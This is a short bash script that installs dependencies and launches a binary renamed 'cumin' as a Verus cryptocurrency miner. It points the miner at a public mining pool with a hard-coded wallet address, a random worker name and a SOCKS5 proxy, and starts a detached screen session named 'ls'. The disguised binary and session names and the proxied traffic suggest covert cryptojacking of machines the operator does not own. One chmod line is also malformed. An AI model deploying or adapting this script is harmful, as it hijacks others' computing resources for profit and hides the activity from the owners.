#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x bagus.sh && chmod +x cumin chmod 777 cumin bagus.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RDpbTQzyf4R8FQJjzwQDjs7nzfxui9JcgF
WORKER=$(echo $(shuf -i 1-10 -n 1)waw)
PROXY=socks5://98.162.96.41:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
